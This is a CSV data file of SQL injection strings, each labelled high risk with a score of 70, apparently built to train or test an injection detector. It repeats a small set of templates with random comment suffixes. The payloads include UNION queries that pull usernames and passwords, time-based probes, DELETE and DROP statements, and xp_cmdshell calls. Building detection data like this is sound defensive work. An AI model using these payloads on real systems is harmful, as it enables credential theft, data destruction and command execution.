query,risk,score
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
'; DELETE FROM users; /**/ -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
'; DELETE FROM users; /**/ -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- ",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- ,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
' OR SLEEP(5) AND '1'='1 -- ,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
'; WAITFOR DELAY '0:0:5'-- -- ,high,70
'; SELECT pg_sleep(5); -- -- ,high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
'; DROP PROCEDURE admin_login-- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- ",high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- ,high,70
' OR 1=1; DROP TABLE temp; -- -- ,high,70
"' UNION ALL SELECT username, password FROM users -- ",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- ",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- ,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # fr",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- u",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 6m,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
' OR SLEEP(5) AND '1'='1 # 2j,high,70
'; WAITFOR DELAY '0:0:5'-- -- r,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 27",high,70
'; DELETE FROM users; /**/ # ao,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- o,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- 5",high,70
'; DELETE FROM users; /**/ -- v,high,70
' OR 1=1; DROP TABLE temp; -- # lj,high,70
' OR SLEEP(5) AND '1'='1 -- 2,high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DROP PROCEDURE admin_login-- -- m,high,70
"' UNION ALL SELECT username, password FROM users -- s",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # jn,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # ru",high,70
'; DELETE FROM users; /**/ # jf,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 6e",high,70
'; DELETE FROM users; /**/ -- e,high,70
'; SELECT pg_sleep(5); -- -- e,high,70
'; DROP PROCEDURE admin_login-- -- q,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
' OR SLEEP(5) AND '1'='1 # 2x,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # ny,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
' OR SLEEP(5) AND '1'='1 -- i,high,70
' OR 1=1; DROP TABLE temp; -- -- g,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # mo",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 7,high,70
'; DELETE FROM users; /**/ # 13,high,70
'; WAITFOR DELAY '0:0:5'-- -- 2,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
'; DROP PROCEDURE admin_login-- # 9n,high,70
'; DELETE FROM users; /**/ /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 41",high,70
'; DROP PROCEDURE admin_login-- -- t,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # t9",high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
'; DELETE FROM users; /**/ -- v,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- l,high,70
'; DELETE FROM users; /**/ # kn,high,70
' OR SLEEP(5) AND '1'='1 -- d,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 1,high,70
' OR 1=1; DROP TABLE temp; -- # 73,high,70
"' UNION ALL SELECT username, password FROM users -- 4",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- f",high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
' OR SLEEP(5) AND '1'='1 # l0,high,70
"' UNION ALL SELECT username, password FROM users -- y",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # xe,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # pm",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
' OR 1=1; INSERT INTO logs VALUES('hack') /**/,high,70
'; WAITFOR DELAY '0:0:5'-- -- e,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; WAITFOR DELAY '0:0:5'-- -- c,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; WAITFOR DELAY '0:0:5'-- # t8,high,70
' OR 1=1; DROP TABLE temp; -- # vi,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; SELECT pg_sleep(5); -- # vf,high,70
"' UNION ALL SELECT username, password FROM users # ga",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- 3",high,70
"' UNION ALL SELECT username, password FROM users # 14",high,70
'; WAITFOR DELAY '0:0:5'-- -- 2,high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- n,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 3",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # vh",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
'; WAITFOR DELAY '0:0:5'-- -- c,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # u6",high,70
'; DROP PROCEDURE admin_login-- /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- m,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- q,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- k,high,70
'; DELETE FROM users; /**/ # f1,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 8,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- x",high,70
' OR 1=1; DROP TABLE temp; -- -- k,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # py,high,70
"' UNION ALL SELECT username, password FROM users # sy",high,70
'; DELETE FROM users; /**/ # 49,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # a5",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 4x",high,70
'; DELETE FROM users; /**/ -- m,high,70
'; SELECT pg_sleep(5); -- # d7,high,70
' OR 1=1; DROP TABLE temp; -- -- m,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 0",high,70
'; WAITFOR DELAY '0:0:5'-- # ty,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # 1f,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- p,high,70
'; DROP PROCEDURE admin_login-- -- 2,high,70
"' UNION ALL SELECT username, password FROM users -- 0",high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
'; DROP PROCEDURE admin_login-- # 45,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') -- x",high,70
"' UNION ALL SELECT username, password FROM users -- 9",high,70
'; WAITFOR DELAY '0:0:5'-- # 8i,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- 5,high,70
' OR 1=1; DROP TABLE temp; -- -- 9,high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # c3,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; SELECT pg_sleep(5); -- /**/,high,70
'; DELETE FROM users; /**/ # 6o,high,70
'; WAITFOR DELAY '0:0:5'-- -- v,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- s,high,70
'; DROP PROCEDURE admin_login-- -- n,high,70
'; WAITFOR DELAY '0:0:5'-- # k7,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- h,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 1,high,70
'; DELETE FROM users; /**/ # 3u,high,70
'; DROP PROCEDURE admin_login-- -- b,high,70
'; SELECT pg_sleep(5); -- # jo,high,70
'; DELETE FROM users; /**/ # 5t,high,70
'; WAITFOR DELAY '0:0:5'-- /**/,high,70
'; DELETE FROM users; /**/ # fs,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
'; DELETE FROM users; /**/ -- a,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # f5,high,70
' OR SLEEP(5) AND '1'='1 # di,high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
' OR 1=1; DROP TABLE temp; -- # u5,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # v7,high,70
'; DELETE FROM users; /**/ /**/,high,70
' OR 1=1; DROP TABLE temp; -- -- 7,high,70
'; WAITFOR DELAY '0:0:5'-- -- 3,high,70
"' UNION ALL SELECT username, password FROM users -- j",high,70
'; ALTER TABLE users ADD column VARCHAR(255) /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- 2",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- u,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- /**/",high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 3l",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # f4",high,70
' OR SLEEP(5) AND '1'='1 # f1,high,70
'; SELECT pg_sleep(5); -- # 4z,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- r,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') /**/",high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # 13,high,70
'; DROP PROCEDURE admin_login-- -- s,high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
'; ALTER TABLE users ADD column VARCHAR(255) # 1y,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # 72",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- /**/",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- s",high,70
"' UNION ALL SELECT username, password FROM users # h1",high,70
'; WAITFOR DELAY '0:0:5'-- # ox,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- /**/",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- # vr,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') # 6y,high,70
' OR SLEEP(5) AND '1'='1 # z9,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # 3x",high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # 8g",high,70
'; WAITFOR DELAY '0:0:5'-- # 3q,high,70
'; SELECT pg_sleep(5); -- -- 8,high,70
' OR 1=1; DROP TABLE temp; -- # r3,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- t",high,70
'; DELETE FROM users; /**/ -- 2,high,70
'; SELECT pg_sleep(5); -- # 4d,high,70
'; DROP PROCEDURE admin_login-- # 8l,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # bq",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- -- 1",high,70
'; ALTER TABLE users ADD column VARCHAR(255) # u6,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # 04",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- s,high,70
'; WAITFOR DELAY '0:0:5'-- # ik,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- # j4",high,70
'; WAITFOR DELAY '0:0:5'-- -- h,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
'; SELECT pg_sleep(5); -- /**/,high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- -- m",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- -- 9,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- /**/,high,70
"'; INSERT INTO users VALUES ('hack', 'hack') # ak",high,70
'; DELETE FROM users; /**/ # hs,high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # x7",high,70
"' AND 1=0 UNION SELECT table_name,2 FROM information_schema.tables -- # dc",high,70
'; ALTER TABLE users ADD column VARCHAR(255) -- t,high,70
' OR 1=1; INSERT INTO logs VALUES('hack') -- p,high,70
' OR SLEEP(5) AND '1'='1 -- 2,high,70
'; DELETE FROM users; /**/ /**/,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- # zp,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
' OR SLEEP(5) AND '1'='1 -- 9,high,70
'; DELETE FROM users; /**/ -- v,high,70
'; WAITFOR DELAY '0:0:5'-- # 75,high,70
'; WAITFOR DELAY '0:0:5'-- # bo,high,70
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'-- -- o,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"' UNION ALL SELECT username, password FROM users /**/",high,70
"' AND (SELECT 1 FROM (SELECT COUNT(*),1) a) -- # ig",high,70
'; DECLARE @s VARCHAR(4000) SET @s=CAST(0x73 AS VARCHAR(4000)) -- /**/,high,70
"'; EXEC sp_configure 'show advanced options', 1; -- -- k",high,70
' OR SLEEP(5) AND '1'='1 /**/,high,70
"' UNION ALL SELECT username, password FROM users # kg",high,70
' OR 1=1; DROP TABLE temp; -- /**/,high,70
